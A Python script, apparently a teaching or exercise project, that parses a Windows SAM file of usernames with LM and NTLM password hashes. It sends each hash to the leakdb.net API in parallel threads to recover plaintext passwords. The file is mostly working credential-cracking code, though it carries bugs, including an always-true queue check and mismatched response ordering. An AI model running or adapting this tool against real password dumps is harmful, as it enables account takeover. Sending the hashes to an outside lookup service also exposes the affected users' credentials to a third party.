import HashedCredential
import DictionaryAttack

#import requests  # pip install requests for web API
import os
import json
import urllib.request
import urllib.error
import time
from tkinter.filedialog import askopenfilename
from tkinter import *
from queue import Queue
from threading import Thread


SAM_TARGET_FILE = 'sam_test'   # sam test is a simulated file for testing
PASSWORD_DICTIONARY = 'common_password_list.txt'

def read_and_parse_sam_file_lines(sam_filename):
    # Intent: read in a SAM file and parse out the users and password hashes
    # Precondition: sam_filename is a valid formatted Windows SAM file in
    #               the same path as the python file being fun
    # Post condition: returns a tuple, accounts, of HashedCredential objects containing:
    #      the username, sam_ntlm_hash and sam_lm_hash from the SAM_TARGET_FILE

    accounts = ()  # empty list

    if os.path.isfile(sam_filename):  # if the file is valid

        sam_file = open(sam_filename)

        for each_line in sam_file:

            # split to parse each_line at each delimiting semicolon & assign
            sam_username = each_line.split(":")[0]
            sam_lm_hash = each_line.split(":")[2]
            sam_ntlm_hash = each_line.split(":")[3]

            # create an instance of HashedCredential for each_line
            user_hashes = HashedCredential.HashedCredential(
                username=sam_username, ntlm_hash=sam_ntlm_hash, lm_hash=sam_lm_hash)

            # tuple accounts is immutable. this_accounts is temp in lieu of
            # append()
            this_accounts = (user_hashes,)
            accounts = accounts + this_accounts

        sam_file.close()

    else:  # os.path determined that the sam_filename did not exist
        print("Error locating a file " + sam_filename)

    return accounts

def get_url(a_queue, a_url):
    # Pre: a_url is a legitimate URL
    # Post: the json encoded response is put into a_queue
    # Post: if a rate limit HTTPError is ecountered sleep 10 seconds and try second request
    try:
        response = urllib.request.urlopen(a_url).read()
    except urllib.error.HTTPError as error:
        # If server responds with HTTP Rate Limit error 429
        # sleep and try the request again
        if error.code == 429:
            time.sleep(10)
            response = urllib.request.urlopen(a_url).read()
        else:
            print(error)

    # decode the byte response from and load as json
    jsonResponse = json.loads(response.decode('utf-8'))
    a_queue.put(jsonResponse)

def online_hash_lookup_by_leakedb_api(accounts_list):
    # Intent: check http://api.leakdb.net for each hash stored in accounts_list
    # Precondition: accounts_list has each key as a username and the value
    #               associated with the key is a list of hashed passwords
    # Precondition: able to reach api.leakdb.net over the internet
    # Post condition: generates list of urls to get
    # Post condition: multiple threads are called and the responses are placed into queues
    # Post condition: prints the username and crack attempt results to console

    ntlm_urls = []
    lm_urls = []
    ntlm_queue = Queue()
    lm_queue = Queue()

    for each_user in accounts_list:
        # request this each_user ntlm hash from LeakDB API
        ntlm_urls.append('https://api.leakdb.net/?j=%s' % each_user.ntlm)
        lm_urls.append('https://api.leakdb.net/?j=%s' % each_user.lm)

    for url in ntlm_urls:
        thread = Thread(target=get_url, args=(ntlm_queue, url))
        thread.start()

    for url in lm_urls:
        thread = Thread(target=get_url, args=(lm_queue, url))
        thread.start()

    for this_user in accounts_list:
        if(ntlm_queue.not_empty):
            json = ntlm_queue.get()
            if json['found'] == "true":
                this_user.cracked(json['hashes'][0]['plaintext'])
        if(lm_queue.not_empty):
            json = lm_queue.get()
            if json['found'] == "true":
                this_user.cracked(json['hashes'][0]['plaintext'])
        this_user.write_output()  # echo results
    return

def main():
    read_in_accounts = read_and_parse_sam_file_lines(SAM_TARGET_FILE)
    online_hash_lookup_by_leakedb_api(read_in_accounts)
    return

if __name__ == "__main__":  # stops main execution if imported as module
    main()
